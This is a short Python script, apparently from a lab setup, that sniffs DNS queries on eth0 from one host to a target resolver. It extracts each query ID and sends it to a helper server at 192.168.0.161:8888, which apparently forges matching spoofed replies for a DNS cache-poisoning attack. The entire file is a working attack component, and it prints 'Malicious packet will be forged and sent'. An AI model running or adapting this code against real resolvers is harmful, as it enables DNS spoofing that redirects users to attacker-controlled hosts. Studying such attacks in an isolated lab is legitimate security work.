import requests, sys, threading
from scapy.all import *

dst_ip_c = "192.168.0.10"
dst_ip_k = "192.168.0.100"
src_ip   = "192.168.0.200"


attack_type = None

if __name__ == "__main__":
	print("Start sniffing packets...")
	
	attack_type = str(sys.argv[1]).replace('-', '')
	
	filter_str = "src host " + src_ip + " and dst host " + dst_ip_c + " and dst port 53" if attack_type == 'c' else "src host " + src_ip + " and dst host " + dst_ip_k + " and dst port 53"
			
	while 1:
		sniffed_packet=sniff(iface="eth0", filter=filter_str, count=1)
		if sniffed_packet[0].haslayer(DNS):
			dns=sniffed_packet[0].getlayer(DNS)
			qid=dns.id
			print("Malicious packet will be forged and sent - QID ")
			
			#threading.Thread(target=requests.get, args=('http://192.168.0.160:8888?start_qid=' + str(qid-1000),)).start()
			threading.Thread(target=requests.get, args=('http://192.168.0.161:8888?start_qid=' + str(qid) + '&attack=' + attack_type,)).start()
			#threading.Thread(target=requests.get, args=('http://192.168.0.162:8888?start_qid=' + str(qid+1000),)).start()

